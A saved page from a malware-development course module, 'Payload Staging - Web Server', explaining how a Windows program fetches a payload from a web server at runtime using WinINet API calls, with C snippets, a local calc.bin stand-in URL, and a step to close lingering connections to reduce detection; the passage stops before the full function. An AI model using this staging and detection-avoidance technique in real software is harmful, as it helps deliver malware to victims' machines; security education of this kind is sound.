<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link rel="stylesheet" href="30_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/maldev-icon.png">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="30_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="30_files/css2.css" rel="stylesheet">
        <link href="30_files/css2_002.css" rel="stylesheet">
        <title>Payload Staging - Web Server</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="30_files/app.6a881bc1.css"><link rel="stylesheet" href="30_files/app.6a881bc1.css"><link href="30_files/prism-coldark-dark.css" rel="stylesheet">
<link rel="stylesheet" href="30_files/viewer.css">
    <style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="px-2 sm:px-0 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[150px]" src="30_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Code Database</a>
          </li>

          
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4"></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                              <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Dashboard</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
    <img src="30_files/module-up.svg" width="20px" alt="">
</div>


<div class="bg-gray-900 p-4">
    <div class="flex">
        <input type="hidden" value="17077">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 30 - Payload Staging - Web Server
            </div>
            <div class="ml-2 w-4 h-4 bg-green-800 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="progress-container pr-4">
                <img src="30_files#.svg" onclick="toggleProgress()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="progressToggle" width="20px" alt="Progress Toggle">
            </div>
            <div class="enlarge-container pr-4">
                <img src="30_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" width="20px" alt="Screen Width">
            </div>
            <div class="objectives-container pr-4">
                <img src="30_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" width="20px" alt="Objectives">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="30_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" width="22px" alt="Terminal">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/WebStaging" target="_blank">
                    <img src="30_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20px" alt="Download">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
                
                            
                <h2>Payload Staging - Web Server</h2>
<h3>Introduction</h3>
<p>Throughout the modules thus far, the payload has been consistently 
stored directly within the binary. This is a fast and commonly used 
method to fetch the payload. Unfortunately, in some cases where payload 
size constraints exist, saving the payload inside the code is not a 
feasible approach. The alternative approach is to host the payload on a 
web server and fetch it during execution.</p>
<h3>Setting Up The Web Server</h3>
<p>This module requires a web server to host the payload file. The easiest way is to use <a href="https://docs.python.org/3/library/http.server.html" target="_blank">Python's HTTP server</a> using the following command:</p>
<p><code>python -m http.server 8000</code></p>
<p>Note that the payload file should be hosted in the same directory where this command is executed.</p>
<p><img src="30_files/python-http-server.png" alt="image"></p>
<br>
<p>To verify the web server is working, head to <a href="http://127.0.0.1:8000/" target="_blank">http://127.0.0.1:8000</a> using the browser.</p>
<p><img src="30_files/python-http-server-2.png" alt="image"></p>
<h3>Fetching The Payload</h3>
<p>To fetch the payload from the web server, the following Windows APIs will be used:</p>
<ul>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw" target="_blank">InternetOpenW</a> - Opens an internet session handle which is a prerequisite to using the other Internet Windows APIs</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw" target="_blank">InternetOpenUrlW</a> - Open a handle to the specified resource which is the payload's URL.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile" target="_blank">InternetReadFile</a> - Reads data from the web resource handle. This is the handle opened by <code>InternetOpenUrlW</code>.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle" target="_blank">InternetCloseHandle</a> - Closes the handle.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw" target="_blank">InternetSetOptionW</a> - Sets an Internet option.</p>
</li>
</ul>
<h3>Opening An Internet Session</h3>
<p>The first step is to open an internet session handle using <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw" target="_blank">InternetOpenW</a> which initializes an application's use of the WinINet functions. All the parameters being passed to the WinAPI are <code>NULL</code> since they are mainly for proxy-related matters. It is worth noting that having the second parameter set to <code>NULL</code> is equivalent to using <code>INTERNET_OPEN_TYPE_PRECONFIG</code>,
 which specifies that the system's current configuration should be used 
to determine the proxy settings for the Internet connection.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">HINTERNET <span class="token function">InternetOpenW</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPCWSTR lpszAgent<span class="token punctuation">,</span>       <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD   dwAccessType<span class="token punctuation">,</span>    <span class="token comment">// NULL or INTERNET_OPEN_TYPE_PRECONFIG</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPCWSTR lpszProxy<span class="token punctuation">,</span>       <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPCWSTR lpszProxyBypass<span class="token punctuation">,</span> <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD   dwFlags          <span class="token comment">// NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Calling the function is shown in the snippet below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// Opening an internet session handle</span>
hInternet <span class="token operator">=</span> <span class="token function">InternetOpenW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Opening a Handle To Payload</h3>
<p>Moving on to the next WinAPI used, <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw" target="_blank">InternetOpenUrlW</a>, where a connection is being established to the payloads's URL.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">HINTERNET <span class="token function">InternetOpenUrlW</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HINTERNET hInternet<span class="token punctuation">,</span>       <span class="token comment">// Handle opened by InternetOpenW</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPCWSTR   lpszUrl<span class="token punctuation">,</span>         <span class="token comment">// The payload's URL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPCWSTR   lpszHeaders<span class="token punctuation">,</span>     <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD     dwHeadersLength<span class="token punctuation">,</span> <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD     dwFlags<span class="token punctuation">,</span>         <span class="token comment">// INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD_PTR dwContext        <span class="token comment">// NULL</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Calling the function is shown in the snippet below. The fifth parameter of the function uses <code>INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</code>
 to achieve a higher success rate with the HTTP request in case of an 
error on the server side. It's possible to use additional flags such as <code>INTERNET_FLAG_IGNORE_CERT_CN_INVALID</code> but that will be left up to the reader. The flags are well explained in Microsoft's <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw" target="_blank">documentation</a>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// Opening a handle to the payload's URL</span>
hInternetFile <span class="token operator">=</span> <span class="token function">InternetOpenUrlW</span><span class="token punctuation">(</span>hInternet<span class="token punctuation">,</span> L<span class="token string">"http://127.0.0.1:8000/calc.bin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_FLAG_HYPERLINK <span class="token operator">|</span> INTERNET_FLAG_IGNORE_CERT_DATE_INVALID<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Reading Data</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile" target="_blank">InternetReadFile</a> is the next WinAPI used which will read the payload.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">InternetReadFile</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>  HINTERNET hFile<span class="token punctuation">,</span>                  <span class="token comment">// Handle opened by InternetOpenUrlW</span>
  <span class="token punctuation">[</span>out<span class="token punctuation">]</span> LPVOID    lpBuffer<span class="token punctuation">,</span>               <span class="token comment">// Buffer to store the payload</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>  DWORD     dwNumberOfBytesToRead<span class="token punctuation">,</span>  <span class="token comment">// The number of bytes to read</span>
  <span class="token punctuation">[</span>out<span class="token punctuation">]</span> LPDWORD   lpdwNumberOfBytesRead   <span class="token comment">// Pointer to a variable that receives the number of bytes read</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Before calling the function, a buffer must be allocated to hold the payload. Therefore, <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc" target="_blank">LocalAlloc</a> is used to allocate a buffer the same size as the payload, 272 bytes. Once the buffer has been allocated, <code>InternetReadFile</code> can be used to read the payload. The function requires the number of bytes to read which in this case is <code>272</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">pBytes <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">LocalAlloc</span><span class="token punctuation">(</span>LPTR<span class="token punctuation">,</span> <span class="token number">272</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">InternetReadFile</span><span class="token punctuation">(</span>hInternetFile<span class="token punctuation">,</span> pBytes<span class="token punctuation">,</span> <span class="token number">272</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBytesRead<span class="token punctuation">)</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Closing InternetHandle</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle" target="_blank">InternetCloseHandle</a> is used to close an internet handle. This should be called once the payload has been successfully fetched.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">InternetCloseHandle</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HINTERNET hInternet <span class="token comment">// Handle opened by InternetOpenW &amp; InternetOpenUrlW</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Closing HTTP/S Connections</h3>
<p>It's important to be aware that the <code>InternetCloseHandle</code> 
WinAPI does not close the HTTP/S connection. WinInet tries to reuse 
connections and therefore although the handle was closed, the connection
 remains active. Closing the connection is vital to lessen the 
possibility of detection. For example, a binary was created that fetches
 a payload from GitHub. The image below shows the binary still connected
 to GitHub although the binary's execution was completed.</p>
<p><img src="30_files/staging-github.png" alt="image"></p>
<p>Luckily, the solution is quite simple. All that is required is to tell WinInet to close all the connections using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw" target="_blank">InternetSetOptionW</a> WinAPI.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">InternetSetOptionW</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HINTERNET hInternet<span class="token punctuation">,</span>     <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD     dwOption<span class="token punctuation">,</span>      <span class="token comment">// INTERNET_OPTION_SETTINGS_CHANGED</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> LPVOID    lpBuffer<span class="token punctuation">,</span>      <span class="token comment">// NULL</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> DWORD     dwBufferLength <span class="token comment">// 0</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Calling <code>InternetSetOptionW</code> with the <code>INTERNET_OPTION_SETTINGS_CHANGED</code>
 flag will cause the system to update the cached version of its internet
 settings and thus resulting in the connections saved by WinInet being 
closed.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token function">InternetSetOptionW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> INTERNET_OPTION_SETTINGS_CHANGED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3>Payload Staging - Code Snippet</h3>
<p><code>GetPayloadFromUrl</code> is a function that uses the previously discussed steps to fetch the payload from a remote server and stores it in a buffer.</p>
